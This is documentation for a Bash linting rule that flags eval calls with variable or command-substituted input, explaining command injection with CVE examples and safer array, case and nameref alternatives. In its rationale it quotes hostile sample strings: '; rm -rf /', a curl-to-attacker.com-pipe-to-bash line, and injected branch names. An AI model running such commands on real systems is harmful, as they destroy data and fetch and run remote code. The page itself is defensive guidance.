---
title: "VNX-BASH-001 – eval with Potentially User-Controlled Input"
description: "Detects eval calls that use a variable, command substitution, or concatenation rather than a static string literal, enabling arbitrary shell command injection if any part of the evaluated string originates from external input."
---

## Overview

This rule flags any use of `eval` in Bash or shell scripts where the argument contains a `$` variable reference or a backtick command substitution. It excludes commented-out lines and lines that consist solely of a static string literal with no variable interpolation.

`eval` causes the shell to re-parse and execute its argument as a new shell command. When any portion of the string passed to `eval` originates from user input, an environment variable set by an untrusted source, a file path, or the output of an external command, an attacker who controls that portion can inject arbitrary shell commands that execute with the script's full privileges.

**Severity:** Critical | **CWE:** [CWE-78 – Improper Neutralisation of Special Elements Used in an OS Command](https://cwe.mitre.org/data/definitions/78.html) | **CAPEC:** [CAPEC-88 – OS Command Injection](https://capec.mitre.org/data/definitions/88.html)

**OWASP ASVS 4.0 – V5.3.8:** Verify that the application protects against OS command injection and that operating system calls use parameterized OS queries or use contextual command line output encoding. (Applies at Level 1, 2, and 3.)

## Why This Matters

`eval` is one of the most dangerous constructs in shell scripting precisely because it grants the programmer the ability to construct commands dynamically — and grants an attacker the same ability. Command injection via `eval` requires no memory corruption or kernel exploits: if the attacker can influence any byte of the evaluated string, they can append `; rm -rf /`, `; curl attacker.com/shell | bash`, or any other command, and it will execute with the full permissions of the running process.

**Real-world examples:**

- **GitHub Actions CI/CD injection (GHSL-2023-100, 2023)** — The Apache Ignite workflow passed the attacker-controlled `${{ github.head_ref }}` branch name into shell commands. An attacker created a pull request from a branch named `master;echo${IFS}"hello";#` to execute injected code in the CI pipeline and exfiltrate the `SONARCLOUD_TOKEN`. Scripts that pass such values through `eval` are directly exploitable.
- **CVE-2023-49291 (tj-actions/branch-names)** — The `branch-names` GitHub Action embedded `github.head_ref` in a shell `run` step. An attacker supplied a branch name containing `${IFS}&&curl${IFS}...${IFS}|${IFS}bash` to download and execute a remote payload with CI permissions.
- **ShellShock (CVE-2014-6271)** — The ShellShock vulnerability was itself a form of `eval`-equivalent behaviour in Bash's function-export mechanism, demonstrating how dynamic shell re-parsing can be weaponised at scale to compromise web servers exposed via CGI.
- **Build script privilege escalation** — CI/CD build scripts frequently run with access to deployment keys, cloud credentials, and package-signing keys. An `eval` of attacker-influenced content in such a context typically leads to full pipeline takeover.

ATT&CK technique T1059.004 (Command and Scripting Interpreter: Unix Shell) covers this class of command injection. Even when the developer believes they control the input, dynamic `eval` is a maintenance hazard — future refactoring may introduce a new code path that feeds external input into the evaluated string without the security implication being recognised.

## What Gets Flagged

```bash
# FLAGGED: variable interpolated into eval
eval "$user_command"

# FLAGGED: command substitution result passed to eval (backtick form)
eval `get_config_value "cmd"`

# FLAGGED: concatenation with an environment variable
eval "docker run $IMAGE_NAME"

# FLAGGED: eval combining multiple variables
eval "$BUILD_CMD --target $TARGET"
```

```bash
# NOT flagged: eval with a purely static string (no variables or substitutions)
eval "set -euo pipefail"
```

## Remediation

**Default Bash behaviour:** Bash does not restrict `eval` in any way — it is the script author's responsibility to avoid or constrain it. Secure usage requires explicit code refactoring.

1. **Eliminate `eval` entirely.** Most uses of `eval` can be replaced with arrays, `declare`, parameter expansion, `case` statements, or direct command invocation.

2. **Use arrays for dynamic command construction.** Build a command as a Bash array and execute it directly instead of constructing a string. Arrays preserve argument boundaries even when values contain spaces or shell metacharacters.

3. **If `eval` is genuinely necessary**, restrict it strictly to a static string you control entirely — a string with no variable references and no command substitutions. Never allow any externally sourced value to appear inside the evaluated string.

4. **Validate and allowlist before any dynamic dispatch.** If you must dispatch dynamically based on input, use a `case` statement with an explicit allowlist of valid options rather than building and evaluating a string.

```bash
# SAFE: use an array to build dynamic commands — no eval needed
cmd_args=("docker" "run" "--rm")
if [[ "$debug" == "true" ]]; then
    cmd_args+=("--entrypoint" "bash")
fi
cmd_args+=("$IMAGE_NAME")
"${cmd_args[@]}"

# SAFE: case statement replaces eval-based dispatch; fails closed on unknown input
run_task() {
    local task="$1"
    case "$task" in
        build)   do_build ;;
        test)    do_test ;;
        deploy)  do_deploy ;;
        *)       echo "Unknown task: $task" >&2; exit 1 ;;
    esac
}

# SAFE: declare -n nameref (Bash 4.3+) instead of eval to expand variable names dynamically
declare -n ref="$varname"
echo "$ref"
```

## References

- [CWE-78: Improper Neutralisation of Special Elements Used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
- [CAPEC-88: OS Command Injection](https://capec.mitre.org/data/definitions/88.html)
- [OWASP ASVS 4.0 – V5.3.8: OS Command Injection](https://owasp-aasvs4.readthedocs.io/en/latest/5.3.8.html)
- [OWASP – OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
- [BashFAQ/048 – Why should eval be avoided in Bash?](https://mywiki.wooledge.org/BashFAQ/048)
- [ShellCheck SC2046 – Quote this to prevent word splitting](https://www.shellcheck.net/wiki/SC2046)
- [ShellCheck SC2006 – Use `$(...)` notation instead of legacy backticks](https://www.shellcheck.net/wiki/SC2006)
- [MITRE ATT&CK T1059.004 – Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
- [GitHub Security Lab GHSL-2023-100 – Apache Ignite command injection](https://securitylab.github.com/advisories/GHSL-2023-100_Apache_Ignite/)
- [CVE-2023-49291 – tj-actions/branch-names script injection](https://github.com/advisories/GHSA-8v8w-v8xg-79rf)
- [GitHub Docs – Script injections in GitHub Actions](https://docs.github.com/en/actions/concepts/security/script-injections)
